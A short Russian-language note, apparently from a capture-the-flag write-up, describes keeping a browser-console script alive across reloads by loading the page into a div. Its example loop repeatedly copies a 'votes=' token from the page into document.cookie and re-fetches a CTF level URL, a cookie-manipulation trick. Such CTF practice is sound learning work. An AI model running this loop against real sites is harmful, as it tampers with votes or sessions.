title: JS hack

Бывает у нас иногда ситуации, когда нужно выполнить javascript на странице из консоли, обновить страницу и продолжить выполнять скрипт. Но вот незадача, при обновлении страницы скрипт останавливается. Решение этой проблемы следующее: страницу можно поместить в элемент, например, div и загружать обновленную страницу в него!
POW:
```js
for(i = 0; i < 1000; i++) {
    s = document.querySelector("div").textContent;
    s = s.substr(s.search("votes=\\d+:\\w+"));
    s = s.substr(0, s.search("\n"));
    console.log(s);
    document.cookie = s;
    s = await fetch("http://kslweb1.spb.ctf.su/second/level23/");
    document.querySelector("div").innerHTML = await s.text();
}
```
